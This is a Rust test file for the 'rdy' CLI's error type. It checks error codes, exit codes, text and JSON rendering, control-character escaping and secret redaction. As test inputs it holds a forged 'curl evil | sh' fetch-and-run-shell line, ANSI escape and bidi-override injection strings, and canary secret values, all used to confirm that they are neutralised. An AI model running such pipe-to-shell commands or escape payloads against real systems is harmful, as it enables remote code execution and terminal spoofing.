//! Tests of the CLI edge error type (M1-021).

use std::ffi::OsString;
use std::io;

use anyhow::Context as _;
use rdy_engine::privilege::{PrivilegeError, Refusal};
use rdy_spec::result::ExitCode;
use rdy_spec::scalar::{DurationProblem, QuantityProblem, TargetProblem, VersionProblem};
use rdy_spec::sig::{KeyId, SignatureError};
use rdy_spec::spec::ProductSlug;
use rdy_spec::{Location, ScalarError, SpecError};
use serde_json::{Value, json};

use super::{
    BUG_HINT, CliError, ErrorCode, InternalKind, IoReason, ReportReason, ReportStep, emit,
    wants_json,
};
use crate::password::{Origin, PasswordError};
use crate::prompt::{Cancel, PromptError};
use crate::trust::{Insecurity, Scope, TrustStoreError};

fn s(text: &str) -> String {
    text.to_owned()
}

fn spec_at(error: SpecError, line: u32, column: u32) -> CliError {
    CliError::Spec {
        file: Some(s("acme-platform.yaml")),
        source: located(error, line, column),
    }
}

/// `SpecError::at` is private to `rdy-spec`; the public way to get a located error is the parser.
fn located(error: SpecError, line: u32, column: u32) -> SpecError {
    SpecError::Located {
        at: Location::new(line, column),
        error: Box::new(error),
    }
}

fn plain(text: &str) -> SpecError {
    SpecError::Syntax { reason: s(text) }
}

/// One of every `CliError` shape.
fn every_cli_error() -> Vec<CliError> {
    let no_file = io::Error::from(io::ErrorKind::NotFound);
    vec![
        CliError::usage("unknown flag --keey", "see 'rdy run --help'"),
        CliError::spec_unreadable("acme-platfrom.yaml", &no_file),
        CliError::spec_unreadable("a", &io::Error::from(io::ErrorKind::PermissionDenied)),
        CliError::spec_unreadable("a", &io::Error::from(io::ErrorKind::IsADirectory)),
        CliError::spec_unreadable("a", &io::Error::other("x")),
        CliError::spec("acme-platform.yaml", plain("bad")),
        CliError::Scalar {
            file: None,
            source: ScalarError::InvalidQuantity {
                value: s("32G"),
                problem: QuantityProblem::DecimalUnit,
            },
        },
        CliError::Password(PasswordError::Empty(Origin::Env)),
        CliError::Prompt(PromptError::TooLong),
        CliError::TrustStore(TrustStoreError::Insecure {
            path: "/etc/rdy/trust.yaml".into(),
            scope: Scope::System,
            why: Insecurity::Writable,
        }),
        CliError::TrustStore(TrustStoreError::NoUserStore),
        CliError::ReportWrite {
            step: ReportStep::CreateFolder,
            path: s("/usr/share/rdy-report-x"),
            reason: IoReason::PermissionDenied.into(),
        },
        CliError::ReportWrite {
            step: ReportStep::WriteFiles,
            path: s("rdy-report-x"),
            reason: IoReason::DiskFull.into(),
        },
        CliError::Interrupted,
        CliError::Internal(InternalKind::Bug),
        CliError::Internal(InternalKind::OutputClosed),
        CliError::Internal(InternalKind::NoRandomness),
        CliError::Internal(InternalKind::FileWrite {
            path: "acme-signing.key".into(),
            reason: IoReason::DiskFull,
        }),
        CliError::Internal(InternalKind::NotImplemented { command: "run" }),
        CliError::Internal(InternalKind::Privilege(PrivilegeError::Refused(vec![
            Refusal::AtSecure,
        ]))),
    ]
}

/// The match has no wildcard, so a new variant of `CliError` fails to compile until it is handled here
/// and listed in `every_cli_error`.
fn check_variant(e: &CliError) -> ErrorCode {
    match e {
        CliError::Usage { .. }
        | CliError::SpecUnreadable { .. }
        | CliError::Spec { .. }
        | CliError::Scalar { .. }
        | CliError::Password(_)
        | CliError::Prompt(_)
        | CliError::TrustStore(_)
        | CliError::ReportWrite { .. }
        | CliError::Interrupted
        | CliError::Internal(_) => {
            let r = e.render();
            assert!(!r.message.is_empty(), "{e:?} has no message");
            assert!(!r.fix.is_empty(), "{e:?} has no fix hint");
            assert!(!e.hint().is_empty(), "{e:?} has no hint");
            assert_eq!(r.code, e.code());
            assert_eq!(r.exit_code(), e.exit_code().code());
            e.code()
        }
    }
}

#[test]
fn every_variant_has_a_message_a_hint_a_code_and_an_exit_code() {
    for e in every_cli_error() {
        let code = check_variant(&e);
        let want = match code {
            ErrorCode::ReportWrite | ErrorCode::Interrupted | ErrorCode::Internal => 70,
            _ => 64,
        };
        assert_eq!(e.exit_code().code(), want, "{e:?}");
    }
}

#[test]
fn the_code_list_is_the_closed_list_of_adr_0008() {
    let want = [
        "usage",
        "spec_unreadable",
        "spec_parse",
        "spec_invalid",
        "spec_unsigned",
        "spec_signature_invalid",
        "spec_key_unknown",
        "spec_expired",
        "trust_store_insecure",
        "report_write",
        "interrupted",
        "internal",
    ];
    let got: Vec<&str> = ErrorCode::ALL.iter().map(|c| c.as_str()).collect();
    assert_eq!(got, want);
    // Codes are lowercase snake_case, unique, and display as their wire text.
    for code in ErrorCode::ALL {
        assert!(
            code.as_str()
                .chars()
                .all(|c| c.is_ascii_lowercase() || c == '_')
        );
        assert_eq!(code.to_string(), code.as_str());
    }
    let mut sorted = got.clone();
    sorted.sort_unstable();
    sorted.dedup();
    assert_eq!(sorted.len(), want.len());
}

#[test]
fn exit_codes_are_64_for_input_and_70_for_rdy() {
    for code in ErrorCode::ALL {
        let want = match code {
            ErrorCode::ReportWrite | ErrorCode::Interrupted | ErrorCode::Internal => {
                ExitCode::Internal
            }
            _ => ExitCode::Usage,
        };
        assert_eq!(code.exit_code(), want, "{code}");
    }
    assert_eq!(ErrorCode::Usage.exit_code().code(), 64);
    assert_eq!(ErrorCode::Internal.exit_code().code(), 70);
    assert_eq!(crate::EXIT_USAGE, 64);
    assert_eq!(crate::EXIT_INTERNAL, 70);
    assert_eq!(crate::EXIT_OK, 0);
}

/// One of every `SpecError` variant that `rdy-spec` has today. The enum is `#[non_exhaustive]`, so a
/// variant added there cannot fail this build. It reaches `spec_invalid` through the wildcard, and
/// `rdy-spec`'s own test checks its hint.
fn every_spec_error() -> Vec<(SpecError, ErrorCode)> {
    use ErrorCode::{
        SpecExpired, SpecInvalid, SpecKeyUnknown, SpecParse, SpecSignatureInvalid, SpecUnsigned,
    };
    vec![
        (SpecError::TooLarge { size: 2, limit: 1 }, SpecParse),
        (SpecError::NotUtf8, SpecParse),
        (plain("x"), SpecParse),
        (SpecError::TooDeep { limit: 64 }, SpecParse),
        (SpecError::MultipleDocuments, SpecParse),
        (SpecError::Directive, SpecParse),
        (SpecError::Tag { tag: s("!x") }, SpecParse),
        (SpecError::Anchor, SpecParse),
        (SpecError::Alias, SpecParse),
        (SpecError::MergeKey, SpecParse),
        (SpecError::DuplicateKey { key: s("k") }, SpecParse),
        (SpecError::NonFiniteNumber { text: s(".nan") }, SpecParse),
        (
            SpecError::UnquotedDecimal {
                key: Some(s("min")),
                text: s("1.30"),
            },
            SpecParse,
        ),
        (SpecError::BadApiVersion { found: None }, SpecInvalid),
        (
            SpecError::UnsupportedApiVersion { found: s("rdy/v2") },
            SpecInvalid,
        ),
        (SpecError::UnknownKey { key: s("metdata") }, SpecInvalid),
        (
            SpecError::UnknownKeyIn {
                key: s("prodcut"),
                section: "metadata",
            },
            SpecInvalid,
        ),
        (
            SpecError::TooManyChecks {
                count: 257,
                limit: 256,
            },
            SpecInvalid,
        ),
        (SpecError::NoChecks, SpecInvalid),
        (
            SpecError::TooManyHosts {
                count: 65,
                limit: 64,
            },
            SpecInvalid,
        ),
        (
            SpecError::TooManyEndpoints {
                count: 257,
                limit: 256,
            },
            SpecInvalid,
        ),
        (SpecError::BadExpires, SpecInvalid),
        (
            SpecError::Expired {
                expired_on: s("2027-01-31"),
                today: s("2027-02-03"),
            },
            SpecExpired,
        ),
        (SpecError::MissingField { field: s("k") }, SpecInvalid),
        (SpecError::InvalidValue { reason: s("r") }, SpecInvalid),
        (SpecError::MissingCheckId { number: 3 }, SpecInvalid),
        (
            SpecError::DuplicateCheck {
                id: s("host.disk"),
                name: None,
            },
            SpecInvalid,
        ),
        (SpecError::InvalidProduct { value: s("A") }, SpecInvalid),
        (SpecError::InvalidCheckId { value: s("A") }, SpecInvalid),
        (SpecError::InvalidCheckName { value: s("A") }, SpecInvalid),
        (SpecError::InvalidSerial { value: u64::MAX }, SpecInvalid),
        (SpecError::Signature(SignatureError::Missing), SpecUnsigned),
        (
            SpecError::Signature(SignatureError::Tampered { crlf: false }),
            SpecSignatureInvalid,
        ),
        (
            SpecError::Signature(SignatureError::UnknownKey {
                key_id: KeyId::from_bytes([1; 8]),
                product: ProductSlug::new("acme-platform").unwrap_or_else(|e| panic!("{e}")),
            }),
            SpecKeyUnknown,
        ),
    ]
}

#[test]
fn every_spec_error_maps_to_a_code_with_a_hint_and_the_right_exit() {
    for (error, want) in every_spec_error() {
        // Bare and located must agree.
        for e in [error.clone(), located(error.clone(), 3, 5)] {
            let cli = CliError::spec("acme-platform.yaml", e);
            assert_eq!(cli.code(), want, "{error:?}");
            assert!(!cli.hint().is_empty(), "{error:?}");
            assert!(!cli.render().message.is_empty(), "{error:?}");
            assert_eq!(cli.exit_code().code(), 64, "{error:?}");
        }
    }
}

#[test]
fn every_scalar_error_is_spec_invalid_with_a_hint() {
    let errors = [
        ScalarError::InvalidQuantity {
            value: s("32G"),
            problem: QuantityProblem::DecimalUnit,
        },
        ScalarError::InvalidDuration {
            value: s("1y"),
            problem: DurationProblem::MissingUnit,
        },
        ScalarError::InvalidVersion {
            value: s("1..2"),
            problem: VersionProblem::BadShape,
        },
        ScalarError::InvalidTarget {
            value: s("a b"),
            problem: TargetProblem::Empty,
        },
    ];
    for source in errors {
        let cli = CliError::Scalar { file: None, source };
        assert_eq!(cli.code(), ErrorCode::SpecInvalid);
        assert_eq!(cli.exit_code().code(), 64);
        assert!(!cli.hint().is_empty());
    }
}

#[test]
fn password_and_prompt_errors_keep_their_codes_and_exit_codes() {
    let cases: Vec<(CliError, ErrorCode, u8)> = vec![
        (
            CliError::Password(PasswordError::Empty(Origin::Stdin)),
            ErrorCode::Usage,
            64,
        ),
        (
            CliError::Prompt(PromptError::NoTerminalConfirm { fix: s("x") }),
            ErrorCode::Usage,
            64,
        ),
        (
            CliError::Prompt(PromptError::Cancelled(Cancel::EndOfInput)),
            ErrorCode::Usage,
            64,
        ),
        (
            CliError::Prompt(PromptError::Cancelled(Cancel::Interrupted)),
            ErrorCode::Interrupted,
            70,
        ),
        (
            CliError::Prompt(PromptError::Io(io::Error::other("x"))),
            ErrorCode::Internal,
            70,
        ),
    ];
    for (cli, code, exit) in cases {
        assert_eq!(cli.code(), code, "{cli:?}");
        assert_eq!(cli.exit_code().code(), exit, "{cli:?}");
        // The method on the prompt error agrees with the edge.
        if let CliError::Prompt(p) = &cli {
            assert_eq!(p.exit_code(), exit);
        }
        assert!(!cli.hint().is_empty());
    }
}

fn text_of(e: &CliError) -> String {
    e.render().text()
}

#[test]
fn golden_text_for_a_spec_parse_error_with_a_position() {
    let e = spec_at(
        SpecError::UnquotedDecimal {
            key: Some(s("min")),
            text: s("1.30"),
        },
        14,
        11,
    );
    assert_eq!(
        text_of(&e),
        "error: acme-platform.yaml:14:11: min is written as the number 1.30, but versions must be text\n\
         fix: write it with quotes, such as min: \"1.30\", so the text stays as typed.\n"
    );
}

#[test]
fn golden_text_for_a_spec_error_without_a_position() {
    let e = CliError::spec(
        "acme-platform.yaml",
        SpecError::TooLarge { size: 3, limit: 2 },
    );
    assert_eq!(
        text_of(&e),
        "error: acme-platform.yaml: the spec is 3 bytes. The limit is 2 bytes\n\
         fix: remove checks or long text from the spec. A spec file can be at most 1 MiB.\n"
    );
}

#[test]
fn golden_text_for_an_unreadable_spec() {
    let e = CliError::spec_unreadable(
        "acme-platfrom.yaml",
        &io::Error::from(io::ErrorKind::NotFound),
    );
    assert_eq!(
        text_of(&e),
        "error: cannot read acme-platfrom.yaml: no such file\n\
         fix: check the file name and the folder you are in\n"
    );
    assert_eq!(e.code(), ErrorCode::SpecUnreadable);
}

#[test]
fn golden_text_for_a_usage_error() {
    let e = CliError::usage("unknown option or argument", "see 'rdy run --help'");
    assert_eq!(
        text_of(&e),
        "error: unknown option or argument\nfix: see 'rdy run --help'\n"
    );
}

#[test]
fn golden_text_for_the_report_folder_and_for_ctrl_c() {
    let e = CliError::ReportWrite {
        step: ReportStep::CreateFolder,
        path: s("/usr/share/rdy-report-acme-quickstart-20270309T101502Z"),
        reason: IoReason::PermissionDenied.into(),
    };
    assert_eq!(
        text_of(&e),
        "error: cannot create the report folder /usr/share/rdy-report-acme-quickstart-20270309T101502Z (permission denied)\n\
         fix: use --out-dir <a folder you can write to>, or --no-report to skip the files\n"
    );
    assert_eq!(
        text_of(&CliError::Interrupted),
        "error: interrupted. No report was written.\nfix: run rdy again and let it finish\n"
    );
}

#[test]
fn every_report_folder_reason_has_its_own_message_and_fix() {
    let write = |step, path: &str, reason: ReportReason| CliError::ReportWrite {
        step,
        path: s(path),
        reason,
    };
    let folder = ReportStep::CreateFolder;
    assert_eq!(
        text_of(&write(
            folder,
            "/mnt/nfs/rdy-report-x",
            ReportReason::NotOwner
        )),
        "error: cannot create the report folder /mnt/nfs/rdy-report-x (the folder is owned by another user)\n\
         fix: use --out-dir <a folder on a local disk>, or --no-report to skip the files. On NFS with root_squash, root cannot own new folders\n"
    );
    assert_eq!(
        text_of(&write(
            folder,
            "/mnt/fat/rdy-report-x",
            ReportReason::NotPrivate
        )),
        "error: cannot create the report folder /mnt/fat/rdy-report-x (the folder cannot be made private)\n\
         fix: use --out-dir <a folder on a disk that keeps Unix permissions>, or --no-report to skip the files\n"
    );
    assert_eq!(
        text_of(&write(
            folder,
            r"C:\Users\jdoe\rdy-reports\rdy-report-x",
            ReportReason::NotPlainFolder
        )),
        "error: cannot create the report folder C:\\Users\\jdoe\\rdy-reports\\rdy-report-x (a link, junction, cloud-sync folder or other redirect is in the way, or it is not a folder)\n\
         fix: use --out-dir <an ordinary folder you own on a local disk, not a link, junction or cloud-sync folder>, or --no-report to skip the files\n"
    );
    assert_eq!(
        text_of(&write(
            folder,
            r"%USERPROFILE%\rdy-reports",
            ReportReason::NoDefaultFolder
        )),
        "error: cannot create the report folder %USERPROFILE%\\rdy-reports (USERPROFILE is not set to a path on a local drive)\n\
         fix: set USERPROFILE, or use --out-dir <a folder you can write to>, or --no-report to skip the files\n"
    );
    assert_eq!(
        text_of(&write(folder, "/tmp/out", ReportReason::NameTaken)),
        "error: cannot create the report folder in /tmp/out (all the folder names are taken)\n\
         fix: wait a second and run again, or use --out-dir <another folder>\n"
    );
    assert_eq!(
        text_of(&write(
            ReportStep::WriteFiles,
            "/tmp/out/rdy-report-x/report.json",
            ReportReason::FileExists
        )),
        format!(
            "error: cannot write the report files to /tmp/out/rdy-report-x/report.json (the file already exists)\nfix: {BUG_HINT}\n"
        )
    );
}

#[test]
fn golden_text_for_a_bug() {
    assert_eq!(
        text_of(&CliError::bug()),
        "error: rdy hit an internal error\n\
         fix: this is a bug in rdy. Please report it at https://github.com/getrdy-io/rdy/issues and include the output of rdy version.\n"
    );
}

#[test]
fn two_line_form_holds_for_every_error() {
    for e in every_cli_error() {
        let text = text_of(&e);
        let lines: Vec<&str> = text.lines().collect();
        assert_eq!(lines.len(), 2, "{text:?}");
        assert!(lines[0].starts_with("error: "), "{text:?}");
        assert!(lines[1].starts_with("fix: "), "{text:?}");
        assert!(text.ends_with('\n'));
    }
}

#[test]
fn no_error_names_the_unsafe_flags() {
    let mut all = every_cli_error();
    all.extend(
        every_spec_error()
            .into_iter()
            .map(|(e, _)| CliError::spec("a.yaml", e)),
    );
    for e in all {
        let text = text_of(&e);
        assert!(!text.contains("--allow-unsigned"), "{text}");
        assert!(!text.contains("run --key"), "{text}");
    }
}

#[test]
fn control_characters_in_a_spec_string_never_reach_the_output() {
    let ansi = "\u{1b}[2J\u{1b}]0;pwned\u{7}\u{202e}evil";
    let e = CliError::Spec {
        file: Some(format!("{ansi}.yaml")),
        source: located(
            SpecError::UnknownKey {
                // Even text that a library forgot to escape is escaped at the edge.
                key: s(ansi),
            },
            2,
            1,
        ),
    };
    let r = e.render();
    for part in [
        r.message.as_str(),
        r.fix.as_str(),
        r.file.as_deref().unwrap_or(""),
    ] {
        assert!(!part.chars().any(char::is_control), "{part:?}");
        assert!(!part.contains('\u{202e}'), "{part:?}");
    }
    assert!(r.message.contains("\\x1b[2J"), "{}", r.message);
    assert!(r.message.contains("\\u{202e}"), "{}", r.message);
    let text = r.text();
    // Exactly the two lines and the final newline.
    assert_eq!(text.matches('\n').count(), 2, "{text:?}");
    assert!(!text.contains('\u{1b}'));
    let json = r.json();
    assert!(!json.contains('\u{1b}'));
}

#[test]
fn a_newline_in_a_message_cannot_forge_a_second_error_line() {
    let e = CliError::spec(
        "a.yaml",
        SpecError::InvalidValue {
            reason: s("bad\nfix: run curl evil | sh"),
        },
    );
    let text = text_of(&e);
    assert_eq!(text.lines().count(), 2, "{text:?}");
    assert!(text.contains("bad\\x0afix: run curl"), "{text:?}");
}

// ---- JSON ----

fn json_of(e: &CliError) -> Value {
    serde_json::from_str(&e.render().json()).unwrap_or_else(|err| panic!("not JSON: {err}"))
}

#[test]
fn json_for_a_parse_error_matches_the_sample_in_07_c_11() {
    let e = CliError::Spec {
        file: Some(s("acme-platform.yaml")),
        source: located(
            SpecError::UnquotedDecimal {
                key: Some(s("min")),
                text: s("1.3"),
            },
            14,
            11,
        ),
    };
    let got = json_of(&e);
    assert_eq!(got["api_version"], "rdy/v1");
    assert_eq!(got["kind"], "Error");
    assert_eq!(got["error"]["code"], "spec_parse");
    assert_eq!(got["error"]["file"], "acme-platform.yaml");
    assert_eq!(got["error"]["line"], 14);
    assert_eq!(got["error"]["column"], 11);
    assert_eq!(got["verdict"], Value::Null);
    assert_eq!(got["complete"], false);
    // The JSON message does not repeat the position.
    let message = got["error"]["message"].as_str().unwrap_or_default();
    assert!(!message.contains("acme-platform.yaml"), "{message}");
    assert!(!message.contains("14:11"), "{message}");
}

#[test]
fn json_for_a_usage_error_and_for_ctrl_c_equal_the_samples_in_07_c_11() {
    let usage = CliError::usage("unknown flag --keey", "see 'rdy run --help'");
    assert_eq!(
        json_of(&usage),
        json!({
            "api_version": "rdy/v1",
            "kind": "Error",
            "error": {
                "code": "usage",
                "message": "unknown flag --keey",
                "fix": "see 'rdy run --help'"
            },
            "verdict": null,
            "complete": false
        })
    );
    assert_eq!(
        json_of(&CliError::Interrupted),
        json!({
            "api_version": "rdy/v1",
            "kind": "Error",
            "error": {
                "code": "interrupted",
                "message": "interrupted. No report was written.",
                "fix": "run rdy again and let it finish"
            },
            "verdict": null,
            "complete": false
        })
    );
}

#[test]
fn json_is_one_document_with_a_final_newline_and_html_safe() {
    let e = CliError::usage("a <b> & c", "see </script>");
    let text = e.render().json();
    assert!(text.ends_with("}\n"), "{text:?}");
    assert_eq!(
        text.matches('\n').count(),
        text.trim_end().matches('\n').count() + 1
    );
    assert!(
        !text.contains('<') && !text.contains('>') && !text.contains('&'),
        "{text}"
    );
    assert!(text.contains("a \\u003cb\\u003e \\u0026 c"), "{text}");
    // It still reads back as the same strings.
    let back: Value = serde_json::from_str(&text).unwrap_or_default();
    assert_eq!(back["error"]["message"], "a <b> & c");
}

#[test]
fn json_keeps_the_field_order_of_the_schema() {
    let text = CliError::usage("m", "f").render().json();
    let keys = ["api_version", "kind", "error", "verdict", "complete"];
    let at: Vec<usize> = keys
        .iter()
        .map(|k| text.find(&format!("\"{k}\"")).unwrap_or(usize::MAX))
        .collect();
    assert!(at.windows(2).all(|w| w[0] < w[1]), "{text}");
}

// ---- emit ----

fn run_emit(e: &CliError, json: bool) -> (u8, String, String) {
    let (mut out, mut err) = (Vec::new(), Vec::new());
    let code = emit(e, json, &mut out, &mut err);
    (
        code,
        String::from_utf8(out).unwrap_or_default(),
        String::from_utf8(err).unwrap_or_default(),
    )
}

#[test]
fn emit_writes_stderr_always_and_stdout_only_with_json() {
    let e = CliError::spec("a.yaml", SpecError::Anchor);
    let (code, out, err) = run_emit(&e, false);
    assert_eq!((code, out.as_str()), (64, ""));
    assert!(err.starts_with("error: a.yaml: anchors"), "{err}");
    let (code, out, err2) = run_emit(&e, true);
    assert_eq!(code, 64);
    assert_eq!(err2, err, "stderr is the same text with and without --json");
    assert!(out.starts_with("{\n"), "{out}");
    let doc: Value = serde_json::from_str(&out).unwrap_or_default();
    // The same text on stderr and in the JSON (07 section 4.1).
    let line = format!(
        "error: {}: {}\nfix: {}\n",
        doc["error"]["file"].as_str().unwrap_or_default(),
        doc["error"]["message"].as_str().unwrap_or_default(),
        doc["error"]["fix"].as_str().unwrap_or_default()
    );
    assert_eq!(line, err);
}

#[test]
fn emit_returns_70_for_rdy_failures() {
    let (code, _, _) = run_emit(&CliError::Interrupted, true);
    assert_eq!(code, 70);
}

struct Broken;
impl io::Write for Broken {
    fn write(&mut self, _: &[u8]) -> io::Result<usize> {
        Err(io::Error::other("closed"))
    }
    fn flush(&mut self) -> io::Result<()> {
        Err(io::Error::other("closed"))
    }
}

#[test]
fn emit_survives_closed_streams_and_still_returns_the_code() {
    let e = CliError::usage("m", "f");
    assert_eq!(emit(&e, true, &mut Broken, &mut Broken), 64);
}

// ---- anyhow ----

#[test]
fn from_anyhow_finds_the_typed_error_through_context_layers() {
    let spec = Err::<(), _>(SpecError::Anchor)
        .context("loading the spec")
        .context("running");
    let cli = CliError::from_anyhow(spec.err().unwrap_or_else(|| unreachable!()));
    assert_eq!(cli.code(), ErrorCode::SpecParse);

    let cli = CliError::from_anyhow(anyhow::Error::new(CliError::Interrupted).context("x"));
    assert!(matches!(cli, CliError::Interrupted));

    let cli = CliError::from_anyhow(anyhow::Error::new(PasswordError::Empty(Origin::Env)));
    assert!(matches!(cli, CliError::Password(_)));

    let cli = CliError::from_anyhow(anyhow::Error::new(PromptError::TooLong));
    assert!(matches!(cli, CliError::Prompt(_)));

    let scalar = ScalarError::InvalidVersion {
        value: s("x"),
        problem: VersionProblem::BadShape,
    };
    let cli = CliError::from_anyhow(anyhow::Error::new(scalar));
    assert!(matches!(cli, CliError::Scalar { .. }));
}

#[test]
fn from_anyhow_turns_an_unknown_error_into_a_bug_without_its_text() {
    let secret = "token=rdy_st_CANARY-7f3a at /home/someone/.config";
    let cli = CliError::from_anyhow(anyhow::anyhow!(secret).context("deep"));
    assert_eq!(cli.code(), ErrorCode::Internal);
    assert_eq!(cli.exit_code().code(), 70);
    let all = format!("{}{}", cli.render().text(), cli.render().json());
    assert!(!all.contains("CANARY"), "{all}");
    assert!(!all.contains("/home/"), "{all}");
    assert_eq!(cli.hint(), BUG_HINT);
}

// ---- io reasons ----

#[test]
fn io_errors_become_plain_words_not_os_errors() {
    let cases = [
        (io::ErrorKind::NotFound, "no such file"),
        (io::ErrorKind::PermissionDenied, "permission denied"),
        (io::ErrorKind::IsADirectory, "not a regular file"),
        (io::ErrorKind::StorageFull, "the disk is full"),
        (io::ErrorKind::TimedOut, "an unexpected error"),
    ];
    for (kind, want) in cases {
        let reason = IoReason::from_io(&io::Error::from(kind));
        assert_eq!(reason.to_string(), want);
    }
    let raw = io::Error::from_raw_os_error(13);
    let text = text_of(&CliError::spec_unreadable("a.yaml", &raw));
    assert!(!text.contains("os error"), "{text}");
}

// ---- wants_json ----

fn args(list: &[&str]) -> Vec<OsString> {
    list.iter().map(OsString::from).collect()
}

#[test]
fn wants_json_reads_the_exact_flag_before_the_double_dash() {
    assert!(wants_json(&args(&["rdy", "run", "s.yaml", "--json"])));
    assert!(wants_json(&args(&["rdy", "--json", "run"])));
    assert!(!wants_json(&args(&["rdy", "run", "s.yaml"])));
    assert!(!wants_json(&args(&["rdy", "run", "--jsno"])));
    assert!(!wants_json(&args(&["rdy", "run", "--json=1x"])));
    assert!(!wants_json(&args(&["rdy", "run", "--", "--json"])));
    // The program name is not an argument.
    assert!(!wants_json(&args(&["--json"])));
    // Bytes that are not UTF-8 do not panic.
    #[cfg(unix)]
    {
        use std::os::unix::ffi::OsStringExt;
        let weird = OsString::from_vec(vec![b'-', b'-', 0xff]);
        assert!(!wants_json(&[OsString::from("rdy"), weird]));
    }
}

// ---- redaction (M1-056) ----

#[test]
fn rendered_text_and_json_pass_through_the_redactor() {
    // A path as typed can hold anything, including a secret by key name.
    let path = "token=canary-path-1.yaml";
    let cli = CliError::spec_unreadable(path, &io::Error::from(io::ErrorKind::NotFound));
    let shown = cli.render();
    for part in [shown.text(), shown.json()] {
        assert!(!part.contains("canary-path-1"), "{part}");
        assert!(part.contains("[REDACTED:secret_by_key:"), "{part}");
    }
    let usage = CliError::usage("bad value password=canary-usage-2", "token: canary-fix-3");
    let all = format!("{}{}", usage.render().text(), usage.render().json());
    assert!(!all.contains("canary-"), "{all}");
    let spec = CliError::spec("secret=canary-file-4.yaml", SpecError::NotUtf8);
    let all = format!("{}{}", spec.render().text(), spec.render().json());
    assert!(!all.contains("canary-"), "{all}");
}

#[test]
fn a_tab_before_the_equals_sign_does_not_hide_a_secret_from_error_text() {
    // The key-name rule reads raw tabs. Redaction must run before the tab is escaped to `\x09`.
    let cli = CliError::usage("password\t= canary-tab-1", "password: a\n\tcanary-tab-2");
    let shown = cli.render();
    for part in [&shown.message, &shown.fix] {
        assert!(!part.contains("canary-tab-"), "{part:?}");
        assert!(!part.contains('\t'), "{part:?}");
    }
    let all = format!("{}{}", shown.text(), shown.json());
    assert!(!all.contains("canary-tab-"), "{all}");
}

#[test]
fn fixed_error_text_is_not_changed_by_the_redactor() {
    for cli in [CliError::Interrupted, CliError::bug()] {
        let shown = cli.render();
        assert!(!shown.message.contains("REDACTED"), "{}", shown.message);
        assert!(!shown.fix.contains("REDACTED"), "{}", shown.fix);
    }
}

#[test]
fn an_insecure_trust_store_is_trust_store_insecure_with_the_documented_text() {
    let err = CliError::TrustStore(TrustStoreError::Insecure {
        path: "/etc/rdy/trust.yaml".into(),
        scope: Scope::System,
        why: Insecurity::Writable,
    });
    assert_eq!(err.code(), ErrorCode::TrustStoreInsecure);
    assert_eq!(err.exit_code().code(), 64);
    let (mut out, mut errout) = (Vec::new(), Vec::new());
    assert_eq!(emit(&err, true, &mut out, &mut errout), 64);
    assert_eq!(
        String::from_utf8(errout).expect("utf8"),
        "error: /etc/rdy/trust.yaml is writable by other users\nfix: chmod 644 /etc/rdy/trust.yaml\n"
    );
    let json: Value = serde_json::from_slice(&out).expect("json");
    assert_eq!(json["error"]["code"], "trust_store_insecure");
    assert!(json["error"].get("file").is_none());
}

#[test]
fn an_invalid_trust_file_points_at_the_line() {
    let err = CliError::TrustStore(TrustStoreError::Invalid {
        path: "/home/u/.config/rdy/trust.yaml".into(),
        source: rdy_spec::sig::TrustFileError::UnknownField {
            key: s("extra"),
            at: Some(Location::new(3, 1)),
        },
    });
    let r = err.render();
    assert_eq!(r.code, ErrorCode::Usage);
    assert_eq!(r.file.as_deref(), Some("/home/u/.config/rdy/trust.yaml"));
    assert_eq!((r.line, r.column), (Some(3), Some(1)));
    assert!(r.fix.contains("rdy trust list"), "{}", r.fix);
}

#[test]
fn a_trust_store_error_survives_anyhow_context() {
    let err = anyhow::Error::new(TrustStoreError::Unsupported).context("pinning a key");
    let found = CliError::from_anyhow(err);
    assert!(matches!(
        found,
        CliError::TrustStore(TrustStoreError::Unsupported)
    ));
}

#[test]
fn a_trust_path_with_control_characters_is_escaped_in_the_message_and_the_fix() {
    let err = CliError::TrustStore(TrustStoreError::Insecure {
        path: "/tmp/\u{1b}[2Jevil/trust.yaml".into(),
        scope: Scope::User,
        why: Insecurity::Writable,
    });
    let r = err.render();
    assert!(!r.message.contains('\u{1b}') && !r.fix.contains('\u{1b}'));
    assert!(!r.text().contains('\u{1b}'));
}
